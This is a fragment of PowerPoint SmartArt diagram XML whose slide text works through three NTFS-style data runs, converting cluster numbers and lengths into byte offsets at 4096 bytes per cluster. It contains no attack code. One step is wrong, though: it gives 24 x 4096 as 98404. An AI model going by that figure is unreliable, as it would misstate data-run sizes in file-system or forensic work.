    </dgm:pt>
    <dgm:pt modelId="{77F6BA00-8524-4735-BDF4-3EBC8AC90D69}" type="pres">
      <dgm:prSet presAssocID="{3D597125-9DD6-4646-9AB5-CADD30F44BA2}" presName="composite" presStyleCnt="0"/>
      <dgm:spPr bwMode="auto"/>
    </dgm:pt>
    <dgm:pt modelId="{95E5A0F4-920A-4092-8EC1-687E09E3386A}" type="pres">
      <dgm:prSet presAssocID="{3D597125-9DD6-4646-9AB5-CADD30F44BA2}" presName="parentText" presStyleLbl="alignNode1" presStyleIdx="2" presStyleCnt="3">
        <dgm:presLayoutVars>
          <dgm:chMax val="1"/>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr bwMode="auto">
        <a:solidFill>
          <a:schemeClr val="accent3">
            <a:lumMod val="60000"/>
            <a:lumOff val="40000"/>
          </a:schemeClr>
        </a:solidFill>
        <a:ln w="12700" cap="flat" cmpd="sng" algn="ctr">
          <a:solidFill>
            <a:schemeClr val="accent3">
              <a:lumMod val="60000"/>
              <a:lumOff val="40000"/>
            </a:schemeClr>
          </a:solidFill>
          <a:prstDash val="solid"/>
          <a:miter lim="800000"/>
        </a:ln>
      </dgm:spPr>
    </dgm:pt>
    <dgm:pt modelId="{AD8CDCB3-06DA-4690-B26E-756DE1520BDC}" type="pres">
      <dgm:prSet presAssocID="{3D597125-9DD6-4646-9AB5-CADD30F44BA2}" presName="descendantText" presStyleLbl="alignAcc1" presStyleIdx="2" presStyleCnt="3">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr bwMode="auto">
        <a:solidFill>
          <a:schemeClr val="bg1">
            <a:alpha val="90000"/>
          </a:schemeClr>
        </a:solidFill>
      </dgm:spPr>
    </dgm:pt>
  </dgm:ptLst>
  <dgm:cxnLst>
    <dgm:cxn modelId="{DA2FE200-7DBE-4CFA-858C-4ABB66EE501D}" type="parOf" srcId="{A320BBA4-B6A6-4766-AB13-8DE6E4C89A29}" destId="{512A9BCB-8810-4156-9847-A7D258E1C10B}" srcOrd="0" destOrd="0" parTransId="{66D02BCB-71CB-49DC-BC8B-AAC332B6B6D8}" sibTransId="{5013CD08-6EC2-439C-A614-6CB2C9D11DD4}"/>
    <dgm:cxn modelId="{F70EA80D-7A46-4705-BD6D-0B775A83D4C4}" type="parOf" srcId="{6F3CC5B1-39AF-4E37-86E7-2120949C889A}" destId="{C8507FAA-58F1-43E2-8DB5-E84DF64F141D}" srcOrd="0" destOrd="0" parTransId="{2A40080A-0F5A-4CB7-8808-536E4534EF5C}" sibTransId="{AA522E9B-02C6-485B-929D-8F1C4F4C40EF}"/>
    <dgm:cxn modelId="{25B32F11-5613-40C0-BEB6-F06AE8EBD05E}" type="parOf" srcId="{57F86B12-4B7C-4FEA-ADDA-303ABA1A058A}" destId="{A320BBA4-B6A6-4766-AB13-8DE6E4C89A29}" srcOrd="0" destOrd="0" parTransId="{995D0939-7363-4715-B761-71082B9E3587}" sibTransId="{2D66CEAC-AD0E-4BBB-9AE5-BEC958DD8D61}"/>
    <dgm:cxn modelId="{23F9BB13-53D2-44A9-8E64-1F7C1EB6730B}" type="parOf" srcId="{3D597125-9DD6-4646-9AB5-CADD30F44BA2}" destId="{E58DFE4E-6996-4390-8868-136E0077A2CE}" srcOrd="0" destOrd="0" parTransId="{E6DA6346-D606-4B23-877E-6F746BBEA74D}" sibTransId="{99680B4B-2F23-499E-B5BB-1ADCE471C7AA}"/>
    <dgm:cxn modelId="{A1EEDC1C-3B18-49B8-8DBB-EEAE0FFEC25D}" type="parOf" srcId="{57F86B12-4B7C-4FEA-ADDA-303ABA1A058A}" destId="{3D597125-9DD6-4646-9AB5-CADD30F44BA2}" srcOrd="2" destOrd="0" parTransId="{22A3D2B9-0E69-4ADE-AB1C-F6CA8CC08259}" sibTransId="{2DC7291B-19B6-4281-A704-DDAC5C199545}"/>
    <dgm:cxn modelId="{C59CA22C-9A88-414A-97B7-EC8BB1FA3272}" type="parOf" srcId="{6F3CC5B1-39AF-4E37-86E7-2120949C889A}" destId="{F077E0D5-8EC5-4A71-9EC2-2628C5F94117}" srcOrd="1" destOrd="0" parTransId="{68A16127-1509-43BB-A7EF-6D381FBD29C1}" sibTransId="{22938F7A-23E1-4BEE-A1F2-2A65C4E06450}"/>
    <dgm:cxn modelId="{3FF0A853-663E-49FE-8C10-D5A3D4C1FC21}" type="presOf" srcId="{2630FCFA-90EE-4A9F-B769-05F9FA3692D6}" destId="{40DBFC1C-2F42-4F4A-8F3E-FACA60C06695}" srcOrd="0" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/chevron2"/>
    <dgm:cxn modelId="{33F36D82-6066-45AB-AEB6-42ABCACE7776}" type="parOf" srcId="{57F86B12-4B7C-4FEA-ADDA-303ABA1A058A}" destId="{6F3CC5B1-39AF-4E37-86E7-2120949C889A}" srcOrd="1" destOrd="0" parTransId="{886A3447-E2BB-4FC9-A070-08980BB7F132}" sibTransId="{1A890983-AC36-4FB0-8C41-C62FC9218C7A}"/>
    <dgm:cxn modelId="{0B06B486-6C7C-48ED-B9A4-42880ED876F1}" type="presOf" srcId="{8B5DC24E-8BCF-4FB3-BC31-51E4DD9317AF}" destId="{AD8CDCB3-06DA-4690-B26E-756DE1520BDC}" srcOrd="0" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/chevron2"/>
    <dgm:cxn modelId="{59C3848D-D546-4BE2-B296-2601A533EF82}" type="presOf" srcId="{6F3CC5B1-39AF-4E37-86E7-2120949C889A}" destId="{1655B817-94DA-48EF-987F-A3F1D35039B7}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/chevron2"/>
    <dgm:cxn modelId="{0F9C728E-1003-4C5D-B0E1-68F0144580B8}" type="parOf" srcId="{3D597125-9DD6-4646-9AB5-CADD30F44BA2}" destId="{8B5DC24E-8BCF-4FB3-BC31-51E4DD9317AF}" srcOrd="1" destOrd="0" parTransId="{83D60278-1BDF-4097-B242-912162FC0C10}" sibTransId="{8721F462-2A58-4003-9FFC-0F4EA09CA374}"/>
    <dgm:cxn modelId="{D12DBF92-C9A1-481C-924C-4809ACA70861}" type="presOf" srcId="{512A9BCB-8810-4156-9847-A7D258E1C10B}" destId="{40DBFC1C-2F42-4F4A-8F3E-FACA60C06695}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/chevron2"/>
    <dgm:cxn modelId="{E9B334A0-C969-4C5F-A46F-E25526A99E24}" type="presOf" srcId="{F077E0D5-8EC5-4A71-9EC2-2628C5F94117}" destId="{2747AAF1-42FA-4449-8F72-416DE9BB4869}" srcOrd="0" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/chevron2"/>
    <dgm:cxn modelId="{159E05BD-9A76-45A5-97CD-1A1CFE633E7B}" type="presOf" srcId="{C8507FAA-58F1-43E2-8DB5-E84DF64F141D}" destId="{2747AAF1-42FA-4449-8F72-416DE9BB4869}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/chevron2"/>
    <dgm:cxn modelId="{6E9C5EC3-5C0A-4AD1-A22E-C65956DF70F2}" type="presOf" srcId="{3D597125-9DD6-4646-9AB5-CADD30F44BA2}" destId="{95E5A0F4-920A-4092-8EC1-687E09E3386A}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/chevron2"/>
    <dgm:cxn modelId="{7DE1D6D3-B229-40B0-821A-56D560B71EE9}" type="presOf" srcId="{E58DFE4E-6996-4390-8868-136E0077A2CE}" destId="{AD8CDCB3-06DA-4690-B26E-756DE1520BDC}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/chevron2"/>
    <dgm:cxn modelId="{AF56F5EC-EB4D-4C67-B0FF-5F8FEDA0F5D5}" type="presOf" srcId="{57F86B12-4B7C-4FEA-ADDA-303ABA1A058A}" destId="{63D4614A-F897-46AF-A1D8-68B89D2F4446}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/chevron2"/>
    <dgm:cxn modelId="{E86B41F1-DC7F-49E5-B6AD-9CA48C754051}" type="parOf" srcId="{A320BBA4-B6A6-4766-AB13-8DE6E4C89A29}" destId="{2630FCFA-90EE-4A9F-B769-05F9FA3692D6}" srcOrd="1" destOrd="0" parTransId="{0BA61F09-6A0F-494F-AA3A-C8421C165902}" sibTransId="{828421A0-02E9-4B16-95B0-4F95AC16511A}"/>
    <dgm:cxn modelId="{1378D3FC-A298-4ACE-8143-9DA31BAF4ADE}" type="presOf" srcId="{A320BBA4-B6A6-4766-AB13-8DE6E4C89A29}" destId="{17D82F43-0080-46F1-8CDC-D6A925F3629B}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/chevron2"/>
    <dgm:cxn modelId="{36EDDC56-B767-49F1-9A1E-4099FBC87392}" type="presParOf" srcId="{63D4614A-F897-46AF-A1D8-68B89D2F4446}" destId="{CDFAE62F-5B44-4A8D-AC21-2088DF8F676E}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/chevron2"/>
    <dgm:cxn modelId="{CF251BE8-D707-4CED-90E1-BBCB0D9BB7FF}" type="presParOf" srcId="{CDFAE62F-5B44-4A8D-AC21-2088DF8F676E}" destId="{17D82F43-0080-46F1-8CDC-D6A925F3629B}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/chevron2"/>
    <dgm:cxn modelId="{C4488A97-BB52-42A1-9959-7B82A7729117}" type="presParOf" srcId="{CDFAE62F-5B44-4A8D-AC21-2088DF8F676E}" destId="{40DBFC1C-2F42-4F4A-8F3E-FACA60C06695}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/chevron2"/>
    <dgm:cxn modelId="{652AE1E2-601C-4286-AACE-8058954CE69A}" type="presParOf" srcId="{63D4614A-F897-46AF-A1D8-68B89D2F4446}" destId="{E5E9A4F4-9EBC-4E37-BE6C-E2FFEE196DD9}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/chevron2"/>
    <dgm:cxn modelId="{E758E89F-BC91-4854-94F8-1447B18E38BA}" type="presParOf" srcId="{63D4614A-F897-46AF-A1D8-68B89D2F4446}" destId="{A319E543-DBA8-4FEC-8F57-E7E93F57AC50}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/chevron2"/>
    <dgm:cxn modelId="{A6F945F6-B7F0-42D8-A1E9-E9AAA1A103DC}" type="presParOf" srcId="{A319E543-DBA8-4FEC-8F57-E7E93F57AC50}" destId="{1655B817-94DA-48EF-987F-A3F1D35039B7}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/chevron2"/>
    <dgm:cxn modelId="{87B0DB45-7AC4-498C-8811-A2ADBE1A0A45}" type="presParOf" srcId="{A319E543-DBA8-4FEC-8F57-E7E93F57AC50}" destId="{2747AAF1-42FA-4449-8F72-416DE9BB4869}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/chevron2"/>
    <dgm:cxn modelId="{72EF3558-A6F1-4A03-8008-8E252A4D4A69}" type="presParOf" srcId="{63D4614A-F897-46AF-A1D8-68B89D2F4446}" destId="{77CBD59E-38DC-496F-A267-192D76B119A9}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/chevron2"/>
    <dgm:cxn modelId="{C679CDC9-48FB-492C-9117-1DE213D59C76}" type="presParOf" srcId="{63D4614A-F897-46AF-A1D8-68B89D2F4446}" destId="{77F6BA00-8524-4735-BDF4-3EBC8AC90D69}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/chevron2"/>
    <dgm:cxn modelId="{E4ED4DB5-2A31-4128-A405-C2091B4308ED}" type="presParOf" srcId="{77F6BA00-8524-4735-BDF4-3EBC8AC90D69}" destId="{95E5A0F4-920A-4092-8EC1-687E09E3386A}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/chevron2"/>
    <dgm:cxn modelId="{0AA4D9FF-BA7F-4538-BA1D-9166C1B62256}" type="presParOf" srcId="{77F6BA00-8524-4735-BDF4-3EBC8AC90D69}" destId="{AD8CDCB3-06DA-4690-B26E-756DE1520BD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3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543575466" name=""/>
      <dsp:cNvGrpSpPr/>
    </dsp:nvGrpSpPr>
    <dsp:grpSpPr bwMode="auto">
      <a:xfrm rot="0" flipH="0" flipV="0">
        <a:off x="0" y="0"/>
        <a:ext cx="8302623" cy="5535082"/>
        <a:chOff x="0" y="0"/>
        <a:chExt cx="8302623" cy="5535082"/>
      </a:xfrm>
    </dsp:grpSpPr>
    <dsp:sp modelId="{17D82F43-0080-46F1-8CDC-D6A925F3629B}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="1839591998" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr bwMode="auto">
        <a:xfrm rot="5400000">
          <a:off x="-295942" y="299095"/>
          <a:ext cx="1972953" cy="1381066"/>
        </a:xfrm>
        <a:prstGeom prst="chevron">
          <a:avLst>
            <a:gd name="adj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66039" tIns="66039" rIns="66039" bIns="66039" numCol="1" spcCol="1268" rtlCol="0" fromWordArt="0" anchor="ctr" anchorCtr="0" forceAA="0" upright="0" compatLnSpc="0">
          <a:noAutofit/>
        </a:bodyPr>
        <a:lstStyle/>
        <a:p>
          <a:pPr marR="0" lvl="0" algn="l" defTabSz="1689098">
            <a:lnSpc>
              <a:spcPct val="0"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPts val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPts val="1259"/>
            </a:spcAft>
            <a:defRPr/>
          </a:pPr>
          <a:r>
            <a:rPr lang="zh-TW" sz="3000" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Caladea"/>
              <a:ea typeface="Caladea"/>
              <a:cs typeface="Caladea"/>
            </a:rPr>
            <a:t>1</a:t>
          </a:r>
          <a:endParaRPr sz="3000" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
            <a:solidFill>
              <a:schemeClr val="dk1"/>
            </a:solidFill>
            <a:latin typeface="Caladea"/>
            <a:cs typeface="Caladea"/>
          </a:endParaRPr>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm rot="-5400000">
        <a:off x="0" y="693685"/>
        <a:ext cx="1381066" cy="591886"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{40DBFC1C-2F42-4F4A-8F3E-FACA60C06695}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="427739100" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr bwMode="auto">
        <a:xfrm rot="5400000">
          <a:off x="4200634" y="-2769951"/>
          <a:ext cx="1282419" cy="6921554"/>
        </a:xfrm>
        <a:prstGeom prst="round2SameRect">
          <a:avLst>
            <a:gd name="adj1" fmla="val 16667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142238" tIns="12699" rIns="12699" bIns="12699" numCol="1" spcCol="1268" rtlCol="0" fromWordArt="0" anchor="ctr" anchorCtr="0" forceAA="0" upright="0" compatLnSpc="0">
          <a:noAutofit/>
        </a:bodyPr>
        <a:lstStyle/>
        <a:p>
          <a:pPr marL="0" indent="0">
            <a:spcAft>
              <a:spcPts val="839"/>
            </a:spcAft>
            <a:defRPr/>
          </a:pPr>
          <a:r>
            <a:rPr lang="zh-TW" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Liberation Serif"/>
              <a:ea typeface="Liberation Serif"/>
              <a:cs typeface="Liberation Serif"/>
            </a:rPr>
            <a:t>      LCN = 12,592, length = 24 clusters (VCN 0-23)</a:t>
          </a:r>
          <a:endParaRPr sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
            <a:solidFill>
              <a:schemeClr val="dk1"/>
            </a:solidFill>
            <a:latin typeface="Liberation Serif"/>
            <a:cs typeface="Liberation Serif"/>
          </a:endParaRPr>
        </a:p>
        <a:p>
          <a:pPr marL="0" indent="0">
            <a:spcAft>
              <a:spcPts val="839"/>
            </a:spcAft>
            <a:defRPr/>
          </a:pPr>
          <a:r>
            <a:rPr lang="zh-TW" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Liberation Serif"/>
              <a:ea typeface="Liberation Serif"/>
              <a:cs typeface="Liberation Serif"/>
            </a:rPr>
            <a:t>      offset = 12,592 x 4096 = 51,576,832</a:t>
          </a:r>
          <a:endParaRPr lang="zh-TW" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
            <a:solidFill>
              <a:schemeClr val="dk1"/>
            </a:solidFill>
            <a:latin typeface="Liberation Serif"/>
            <a:ea typeface="Liberation Serif"/>
            <a:cs typeface="Liberation Serif"/>
          </a:endParaRPr>
        </a:p>
        <a:p>
          <a:pPr marL="0" indent="0">
            <a:spcAft>
              <a:spcPts val="839"/>
            </a:spcAft>
            <a:defRPr/>
          </a:pPr>
          <a:r>
            <a:rPr lang="zh-TW" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Liberation Serif"/>
              <a:ea typeface="Liberation Serif"/>
              <a:cs typeface="Liberation Serif"/>
            </a:rPr>
            <a:t>      run 1 bytes = 24 x 4096 = 98404</a:t>
          </a:r>
          <a:endParaRPr sz="2000" b="1">
            <a:latin typeface="Liberation Serif"/>
            <a:cs typeface="Liberation Serif"/>
          </a:endParaRPr>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm rot="-5400000">
        <a:off x="1381065" y="112218"/>
        <a:ext cx="6858953" cy="1157213"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{1655B817-94DA-48EF-987F-A3F1D35039B7}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="50843043" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr bwMode="auto">
        <a:xfrm rot="5400000">
          <a:off x="-295942" y="2077007"/>
          <a:ext cx="1972953" cy="1381066"/>
        </a:xfrm>
        <a:prstGeom prst="chevron">
          <a:avLst>
            <a:gd name="adj" fmla="val 50000"/>
          </a:avLst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accent4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47623" tIns="47623" rIns="47623" bIns="47623" numCol="1" spcCol="1268" rtlCol="0" fromWordArt="0" anchor="ctr" anchorCtr="0" forceAA="0" upright="0" compatLnSpc="0">
          <a:noAutofit/>
        </a:bodyPr>
        <a:lstStyle/>
        <a:p>
          <a:pPr marR="0" lvl="0" algn="l" defTabSz="1689098">
            <a:lnSpc>
              <a:spcPct val="0"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPts val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPts val="1259"/>
            </a:spcAft>
            <a:defRPr/>
          </a:pPr>
          <a:r>
            <a:rPr lang="zh-TW" sz="3000" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Caladea"/>
              <a:ea typeface="Caladea"/>
              <a:cs typeface="Caladea"/>
            </a:rPr>
            <a:t>2</a:t>
          </a:r>
          <a:endParaRPr sz="3000" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
            <a:solidFill>
              <a:schemeClr val="dk1"/>
            </a:solidFill>
            <a:latin typeface="Caladea"/>
            <a:cs typeface="Caladea"/>
          </a:endParaRPr>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm rot="-5400000">
        <a:off x="0" y="2471596"/>
        <a:ext cx="1381066" cy="591886"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{2747AAF1-42FA-4449-8F72-416DE9BB4869}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="1392739680" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr bwMode="auto">
        <a:xfrm rot="5400000">
          <a:off x="4200635" y="-1038503"/>
          <a:ext cx="1282419" cy="6921554"/>
        </a:xfrm>
        <a:prstGeom prst="round2SameRect">
          <a:avLst>
            <a:gd name="adj1" fmla="val 16667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463562" tIns="41387" rIns="41387" bIns="41387" numCol="1" spcCol="1268" rtlCol="0" fromWordArt="0" anchor="ctr" anchorCtr="0" forceAA="0" upright="0" compatLnSpc="0">
          <a:noAutofit/>
        </a:bodyPr>
        <a:lstStyle/>
        <a:p>
          <a:pPr marL="0" indent="0">
            <a:spcAft>
              <a:spcPts val="839"/>
            </a:spcAft>
            <a:defRPr/>
          </a:pPr>
          <a:r>
            <a:rPr lang="zh-TW" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Liberation Serif"/>
              <a:ea typeface="Liberation Serif"/>
              <a:cs typeface="Liberation Serif"/>
            </a:rPr>
            <a:t>LCN =  7,592, length = 20 clusters  (VCN 24-43)</a:t>
          </a:r>
          <a:endParaRPr sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
            <a:solidFill>
              <a:schemeClr val="dk1"/>
            </a:solidFill>
            <a:latin typeface="Liberation Serif"/>
            <a:cs typeface="Liberation Serif"/>
          </a:endParaRPr>
        </a:p>
        <a:p>
          <a:pPr marL="0" indent="0">
            <a:spcAft>
              <a:spcPts val="839"/>
            </a:spcAft>
            <a:defRPr/>
          </a:pPr>
          <a:r>
            <a:rPr lang="zh-TW" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Liberation Serif"/>
              <a:ea typeface="Liberation Serif"/>
              <a:cs typeface="Liberation Serif"/>
            </a:rPr>
            <a:t>offset = 7,592 x 4096 = 31,096,832</a:t>
          </a:r>
          <a:endParaRPr sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
            <a:solidFill>
              <a:schemeClr val="dk1"/>
            </a:solidFill>
            <a:latin typeface="Liberation Serif"/>
            <a:cs typeface="Liberation Serif"/>
          </a:endParaRPr>
        </a:p>
        <a:p>
          <a:pPr marL="0" indent="0">
            <a:spcAft>
              <a:spcPts val="839"/>
            </a:spcAft>
            <a:defRPr/>
          </a:pPr>
          <a:r>
            <a:rPr lang="zh-TW" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Liberation Serif"/>
              <a:ea typeface="Liberation Serif"/>
              <a:cs typeface="Liberation Serif"/>
            </a:rPr>
            <a:t>run 2 bytes = 20 x 4096 = 81920</a:t>
          </a:r>
          <a:endParaRPr sz="2000" b="1">
            <a:latin typeface="Liberation Serif"/>
            <a:cs typeface="Liberation Serif"/>
          </a:endParaRPr>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm rot="-5400000">
        <a:off x="1381066" y="1843667"/>
        <a:ext cx="6858953" cy="1157213"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{95E5A0F4-920A-4092-8EC1-687E09E3386A}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="1021405652" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr bwMode="auto">
        <a:xfrm rot="5400000">
          <a:off x="-295942" y="3854918"/>
          <a:ext cx="1972953" cy="1381066"/>
        </a:xfrm>
        <a:prstGeom prst="chevron">
          <a:avLst>
            <a:gd name="adj" fmla="val 50000"/>
          </a:avLst>
        </a:prstGeom>
        <a:solidFill>
          <a:schemeClr val="accent3">
            <a:lumMod val="60000"/>
            <a:lumOff val="40000"/>
          </a:schemeClr>
        </a:solidFill>
        <a:ln w="12700" cap="flat" cmpd="sng" algn="ctr">
          <a:solidFill>
            <a:schemeClr val="accent3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  <dsp:txBody>
        <a:bodyPr spcFirstLastPara="0" vertOverflow="overflow" horzOverflow="overflow" vert="horz" wrap="square" lIns="47623" tIns="47623" rIns="47623" bIns="47623" numCol="1" spcCol="1268" rtlCol="0" fromWordArt="0" anchor="ctr" anchorCtr="0" forceAA="0" upright="0" compatLnSpc="0">
          <a:noAutofit/>
        </a:bodyPr>
        <a:lstStyle/>
        <a:p>
          <a:pPr marR="0" lvl="0" algn="l" defTabSz="1689098">
            <a:lnSpc>
              <a:spcPct val="0"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPts val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPts val="1259"/>
            </a:spcAft>
            <a:defRPr/>
          </a:pPr>
          <a:r>
            <a:rPr lang="zh-TW" sz="3000" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Caladea"/>
              <a:ea typeface="Caladea"/>
              <a:cs typeface="Caladea"/>
            </a:rPr>
            <a:t>3</a:t>
          </a:r>
          <a:endParaRPr sz="3000" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
            <a:solidFill>
              <a:schemeClr val="dk1"/>
            </a:solidFill>
            <a:latin typeface="Caladea"/>
            <a:cs typeface="Caladea"/>
          </a:endParaRPr>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm rot="-5400000">
        <a:off x="0" y="4249508"/>
        <a:ext cx="1381066" cy="591886"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{AD8CDCB3-06DA-4690-B26E-756DE1520BDC}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="1127904554" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr bwMode="auto">
        <a:xfrm rot="5400000">
          <a:off x="4200635" y="739406"/>
          <a:ext cx="1282419" cy="6921554"/>
        </a:xfrm>
        <a:prstGeom prst="round2SameRect">
          <a:avLst>
            <a:gd name="adj1" fmla="val 16667"/>
            <a:gd name="adj2" fmla="val 0"/>
          </a:avLst>
        </a:prstGeom>
        <a:solidFill>
          <a:schemeClr val="bg1"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  <dsp:txBody>
        <a:bodyPr spcFirstLastPara="0" vertOverflow="overflow" horzOverflow="overflow" vert="horz" wrap="square" lIns="463562" tIns="41387" rIns="41387" bIns="41387" numCol="1" spcCol="1268" rtlCol="0" fromWordArt="0" anchor="ctr" anchorCtr="0" forceAA="0" upright="0" compatLnSpc="0">
          <a:noAutofit/>
        </a:bodyPr>
        <a:lstStyle/>
        <a:p>
          <a:pPr marL="0" indent="0">
            <a:spcAft>
              <a:spcPts val="839"/>
            </a:spcAft>
            <a:defRPr/>
          </a:pPr>
          <a:r>
            <a:rPr lang="zh-TW" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Liberation Serif"/>
              <a:ea typeface="Liberation Serif"/>
              <a:cs typeface="Liberation Serif"/>
            </a:rPr>
            <a:t>LCN = 16,592, length = 14 clusters  (VCN 44-57)</a:t>
          </a:r>
          <a:endParaRPr sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
            <a:solidFill>
              <a:schemeClr val="dk1"/>
            </a:solidFill>
            <a:latin typeface="Liberation Serif"/>
            <a:cs typeface="Liberation Serif"/>
          </a:endParaRPr>
        </a:p>
        <a:p>
          <a:pPr marL="0" indent="0">
            <a:spcAft>
              <a:spcPts val="839"/>
            </a:spcAft>
            <a:defRPr/>
          </a:pPr>
          <a:r>
            <a:rPr lang="zh-TW" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Liberation Serif"/>
              <a:ea typeface="Liberation Serif"/>
              <a:cs typeface="Liberation Serif"/>
            </a:rPr>
            <a:t>offset = 16,592 x 4096 = 67960832</a:t>
          </a:r>
          <a:endParaRPr sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
            <a:solidFill>
              <a:schemeClr val="dk1"/>
            </a:solidFill>
            <a:latin typeface="Liberation Serif"/>
            <a:cs typeface="Liberation Serif"/>
          </a:endParaRPr>
        </a:p>
        <a:p>
          <a:pPr marL="0" indent="0">
            <a:spcAft>
              <a:spcPts val="839"/>
            </a:spcAft>
            <a:defRPr/>
          </a:pPr>
          <a:r>
            <a:rPr lang="zh-TW" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Liberation Serif"/>
              <a:ea typeface="Liberation Serif"/>
              <a:cs typeface="Liberation Serif"/>
            </a:rPr>
            <a:t>run 3 bytes = 14 x 4096 = 57344</a:t>
          </a:r>
          <a:endParaRPr sz="2000" b="1">
            <a:latin typeface="Liberation Serif"/>
            <a:cs typeface="Liberation Serif"/>
          </a:endParaRPr>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm rot="-5400000">
        <a:off x="1381066" y="3621577"/>
        <a:ext cx="6858953" cy="11572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 type="node">
          <dgm:prSet phldr="1"/>
        </dgm:pt>
        <dgm:pt modelId="11" type="node">
          <dgm:prSet phldr="1"/>
        </dgm:pt>
